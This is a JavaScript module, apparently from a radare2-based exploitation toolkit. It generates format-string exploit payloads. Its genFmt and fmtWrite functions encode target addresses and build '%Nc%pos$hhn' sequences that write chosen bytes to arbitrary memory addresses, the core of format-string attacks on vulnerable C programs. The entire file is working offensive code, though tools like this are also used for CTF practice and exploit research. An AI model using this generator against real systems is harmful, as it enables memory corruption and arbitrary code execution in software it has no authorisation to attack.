'use strict';

const Long = require("long");
const misc = require('./misc');

function genFmt(pos, writes, written)
{
    let x;
    let results = [];
    let fmtString = '';
    let bytes = r2bin.bits / 8;
    let count = (typeof written === 'undefined')? 0 : written;

    /* Parse each write */
    writes.forEach(function(write) {
        let res;

        write.data = write.data.replace("0x", "");
        write.addr = write.addr.replace("0x", "");
        if ((write.data.length) % 2 !== 0)
            write.data = '0' + write.data;

        /*  Data is bigger than arch bits */
        if ((write.data.length/2) > bytes) {
            let addr = Long.fromString(write.addr, true, 16);

            for (x=0; x<write.data.length; x+=(bytes*2)) {
                let data = write.data.substr(x, bytes*2);

                //console.log('addr: ' + misc.longToHex(addr) + ' write: ' + data);

                res = fmtWrite(pos, misc.longToHex(addr), data, count);
                pos = res.pos;
                count = res.written;
                addr = addr.add(bytes);

                results.push(res);
            }

        /*  Data fits in arch bits (one write) */
        } else {
            //console.log('addr: ' + write.addr + ' write: ' + write.data);
            res = fmtWrite(pos, write.addr, write.data, count);
            pos = res.pos;
            count = res.written;

            results.push(res);
        }
    });

    let total = 0;
    results.forEach(function(res) {
        fmtString += res.addresses;
        fmtString += res.fmt;

        total += res.addresses.length / 4;
        total += res.fmt.length;
    });

    console.log('[+] Length: ' + total);
    console.log('[+] Format string: ' + fmtString);

}

function fmtWrite(pos, addr, data, written)
{
    let x, baseAddr;
    let count = written;
    let bytes = r2bin.bits / 8;

    let result = {
        addresses: '',
        fmt: '',
        pos: 0,
        written: 0,
    };

    /* Pad with 0 if neccesary */
    data = data.replace("0x", "");
    if ((data.length) % 2 !== 0)
        data = '0' + data;

    /* Load data into a buffer */
    let dataBuff = Buffer.from(data, 'hex');

    /* Build the addresses string */
    baseAddr = Long.fromString(addr, true, 16);
    for (x=0; x<dataBuff.length; x++) {
        result.addresses += misc.longToHexLittleEscaped(baseAddr);
        baseAddr = baseAddr.add(1);
        count += bytes;

        /* Check for null bytes on addr */
        if (result.addresses.indexOf('\\x00') !== -1) {
            console.log('One of the addresses cointains a null byte :/');
            process.exit(1);
        }
    }

    //console.log('Data buff: ' + dataBuff.toString('hex'));

    /* Add each byte write */
    for (x=dataBuff.length-1; x>-1; x-=1) {
        let currCount = count & 0x000000FF;
        let left;
        //let target = dataBuff.readUInt16BE(x);
        let target = dataBuff.readUInt8(x);

        //console.log('Curr, target: ' + currCount + ', ' + target);

        if (currCount === target) {
            result.fmt += '%' + pos + '$hhn';
            pos++;
            continue;
        }

        /* Increase the character count */
        if (target < currCount)
            left = 256 - currCount + target;
        else
            left = target - currCount;

        result.fmt += '%' + left + 'c';
        result.fmt += '%' + pos + '$hhn';

        count += left;
        pos++;
    }

    /* Padd the fmt if required */
    let padding = 0;
    if ((result.fmt.length % bytes) !== 0) {
        padding = bytes - result.fmt.length % bytes;
        result.fmt += Array(padding+1).join('A');
    }


    result.written = count + padding;
    result.pos = pos + (result.fmt.length / bytes);

    //console.log(result);
    return result;

    //console.log(fmtString);

}

module.exports.genFmt = genFmt;

